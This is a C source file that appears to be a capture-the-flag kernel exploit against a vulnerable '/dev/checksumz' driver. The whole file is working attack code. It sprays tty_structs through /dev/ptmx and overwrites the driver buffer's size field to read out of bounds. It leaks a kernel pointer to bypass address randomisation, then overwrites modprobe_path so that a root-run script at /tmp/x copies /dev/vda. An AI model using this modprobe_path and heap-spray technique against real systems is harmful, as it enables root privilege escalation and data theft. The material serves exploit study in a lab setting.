#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>

#define SPRAY_SZ 0x100
#define PTM_UNIX98_OPS_OFFSET 0x89480
#define MODPROBE_PATH_OFFSET 0x262100
#define KTEXT_SIZE 0x1200000
#define KRODATA_SIZE 0x6dd000

#define CHECKSUMZ_IOCTL_RENAME   _IOWR('@', 0, char*)
#define CHECKSUMZ_IOCTL_PROCESS  _IO('@', 1)
#define CHECKSUMZ_IOCTL_RESIZE   _IOWR('@', 2, uint32_t)
#define CHECKSUMZ_IOCTL_DIGEST   _IOWR('@', 3, uint32_t*)


#define LOG(format, ...) \
    printf("[*] [%s] %s - %d:", __FILE__, __func__, __LINE__); \
    printf(format, ##__VA_ARGS__); \
    printf("\n"); 

struct checksum_buffer {
	loff_t pos; char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t digest;
};

int dev_fd;

unsigned long KERNEL_LEAK = 0;
unsigned long KERNEL_BASE = 0;
unsigned long KERNEL_RODATA = 0;
unsigned long KERNEL_DATA = 0;

unsigned long MODPROBE_PATH = 0;

uint64_t io_seek(int fd, uint64_t offset, int whence){
    uint64_t current_offset = 0;

    current_offset = lseek(fd, offset, whence);
    return current_offset;
}


void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void dump_buffer(void *buf, int len) {
    printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));

        for (int j = 7; j >= 0; j--) {
            printf("%02x", *(unsigned char *)(buf + i + j));
        }

        printf(" - 0x");

        for (int j = 7; j >= 0; j--) {
            printf("%02x", *(unsigned char *)(buf + i + j + 8));
        }

        puts("");
    }
}

void setup() {
	system("echo -ne '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/x");
	system("chmod a+x /tmp/x");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
	LOG("Modprobe Setup done.");
}

void spray_tty_struct(){
    int spray[SPRAY_SZ];

    LOG("Spraying tty_structs");
    for(int i = 0; i < SPRAY_SZ / 2; i++) {
        spray[i] = open("/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }
}


void leak_tty_objects(){

    char buf[0x400];
    uint64_t current_offset = 0x400;
    unsigned long leak;

    for (int i = 0; i < 8; i++){
        LOG("Leaking Object %d\n", i);
        io_seek(dev_fd, current_offset, SEEK_SET);

        read(dev_fd, buf, 0x100);
        dump_buffer(buf, 0x30);

        memcpy(&leak, buf+0x18, 8);
        LOG("Kernel Leak 0x%lx", leak);

        if (leak > 0xffffffff00000000 && (leak & 0xfff) == 0x480){
            KERNEL_LEAK = leak;
            KERNEL_RODATA = leak - PTM_UNIX98_OPS_OFFSET;
            KERNEL_BASE = KERNEL_RODATA - KTEXT_SIZE;
            KERNEL_DATA = KERNEL_RODATA + KRODATA_SIZE;

            LOG("Found kernel leak", KERNEL_LEAK);
            LOG("Kernel .text: 0x%lx\nKernel .rodata: 0x%lx\nKernel .data: 0x%lx\n", KERNEL_BASE, KERNEL_RODATA, KERNEL_DATA);
            break;
        }

        current_offset += 0x400;

    }

}



int main() {

    int bytes_read = 0;
    uint64_t current_offset = 0;
    char write_buf[0x20];
    char *script_name = "/tmp/x\x00";

    bind_core(0);
    setup();

    spray_tty_struct();

    dev_fd = open("/dev/checksumz", O_RDWR);

    spray_tty_struct();

    memset(write_buf, 0, 0x20);
    memset(write_buf, 0xff, 8);

    current_offset = io_seek(dev_fd, 0x200, SEEK_SET);

    write(dev_fd, write_buf, 8); 
    LOG("Overwriting size field for checksumz buffer\n");

    current_offset = io_seek(dev_fd, 0x400, SEEK_SET);
    
    LOG("Searching through tty structs\n");


    current_offset = 0x400;

    leak_tty_objects(); 

    if (KERNEL_BASE != 0){
        printf("Overwriting modprobepath with custom script\n");

        current_offset = io_seek(dev_fd, 0x210, SEEK_SET);

        MODPROBE_PATH = KERNEL_DATA + MODPROBE_PATH_OFFSET;
        LOG("Overwriting name pointer with modprobepath pointer 0x%lx", MODPROBE_PATH);
        memcpy(write_buf, &MODPROBE_PATH, 8);

        write(dev_fd, write_buf, 8);
        
        LOG("Overwriting modprobe path with %s", script_name);
        ioctl(dev_fd, CHECKSUMZ_IOCTL_RENAME, script_name);
        
        LOG("Running modprobe file\n");
        system("/tmp/executeme ; cat /tmp/flag");

    }
    else {
        LOG("Failed to leak kernel through tty_struct spray");
    }

}
